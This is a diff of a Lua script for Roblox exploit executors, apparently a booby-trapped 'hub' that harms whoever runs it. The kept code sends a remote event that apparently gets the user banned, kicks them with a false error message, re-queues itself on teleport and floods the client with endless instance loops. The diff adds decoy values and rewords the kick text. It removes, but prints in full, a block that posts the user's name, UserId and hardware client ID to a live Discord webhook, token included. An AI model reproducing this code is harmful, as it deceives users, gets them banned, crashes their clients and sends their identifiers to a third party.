@@ -1,3 +1,15 @@
+local Debris = game:GetService("Debris")
+
+local vSOafmfmdkgu92 = Instance.new("BoolValue", workspace)
+vSOafmfmdkgu92.Name = "A(*sfkVOXULSAAW2"
+vSOafmfmdkgu92.Value = true
+Debris:AddItem(vSOafmfmdkgu92, 3)
+
+local vSOafmfmdkgu93 = Instance.new("BoolValue", workspace)
+vSOafmfmdkgu93.Name = "A(*VOXUSNFakA@"
+vSOafmfmdkgu93.Value = true
+Debris:AddItem(vSOafmfmdkgu93, 2)
+
 local function GETSECUREGUI()
   return gethui and gethui() or cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
 end
@@ -19,7 +31,7 @@ local LocalPlayer = Players.LocalPlayer
 if game:GetService("ReplicatedStorage"):FindFirstChild("WalkSpeedChanged") then
   game:GetService("ReplicatedStorage").WalkSpeedChanged:FireServer("banned for using kykyryz0B hub<A kiss to freedom🍑 >")
   task.wait(0.1)
-  LocalPlayer:Kick("We Sorry, Roblox!")
+  LocalPlayer:Kick("We found an error and disconnected you from the server, we sorry, Roblox!")
   task.wait(1)
   local instancefetchmethod = getinstancecache or getinstances
   while task.wait() do
@@ -28,40 +40,7 @@ if game:GetService("ReplicatedStorage"):FindFirstChild("WalkSpeedChanged") then
     end
   end
   return
-
-  local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"
-
-local responce = syn.request(
-{
-    Url = Webhook_URL,
-    Method = 'POST',
-    Headers = {
-        ['Content-Type'] = 'application/json'
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = "# ▬▬▬▬▬▬▬▬",
-        ["embeds"] = {{
-            ["title"] = "**Your Script For Slap Battles Has Been Executed!**",
-            ["description"] = "**"..game.Players.LocalPlayer.Name.. "** *with Id* **"..game.Players.LocalPlayer.UserId.. "** *has executed your script in* **"..GameName.."** *And Get Banned!*",
-            ["type"] = "rich",
-            ["color"] = tonumber(0x21db46),
-            ["fields"] = {
-                {
-                    ["name"] = "Hardware ID:",
-                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                    ["inline"] = true
-                }
-            }
-        }}
-    })
-}
-)
 end
-
-local request = syn and syn.request or request
-local responce = request()
 
 local qOT = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 
@@ -69,7 +48,7 @@ local success, v = pcall(function()
   local codeString = [[
 game:GetService("ReplicatedStorage").WalkSpeedChanged:FireServer("banned for using kykyryz0B hub<A kiss to freedom🍑 >")
 task.wait(0.1)
-game:GetService("Players").LocalPlayer:Kick("We Sorry, Roblox!")
+game:GetService("Players").LocalPlayer:Kick("We found an error and disconnected you from the server, we sorry, Roblox!")
 task.wait(1)
 local getinstancemethod = getinstancecache or getinstances
 while task.wait() do
@@ -89,7 +68,7 @@ while true do Instance.new("Part") end
 end)
 
 if not success then
-  LocalPlayer:Kick("We Sorry, Roblox!")
+  LocalPlayer:Kick("We found an error and disconnected you from the server, we sorry, Roblox!")
   task.wait(2)
   local getinstancemethod = getinstancecache or getinstances
   while task.wait() do
@@ -106,33 +85,3 @@ if not success then
   end
   while true do Instance.new("Part") end
 end
-
-local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"
-
-local responce = syn.request(
-{
-    Url = Webhook_URL,
-    Method = 'POST',
-    Headers = {
-        ['Content-Type'] = 'application/json'
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = "# ▬▬▬▬▬▬▬▬",
-        ["embeds"] = {{
-            ["title"] = "**Your Script For Slap Battles Has Been Executed!**",
-            ["description"] = "**"..game.Players.LocalPlayer.Name.. "** *with Id* **"..game.Players.LocalPlayer.UserId.. "** *has executed your script in* **"..GameName.."** *And Get Banned!*",
-            ["type"] = "rich",
-            ["color"] = tonumber(0x21db46),
-            ["fields"] = {
-                {
-                    ["name"] = "Hardware ID:",
-                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                    ["inline"] = true
-                }
-            }
-        }}
-    })
-}
-)
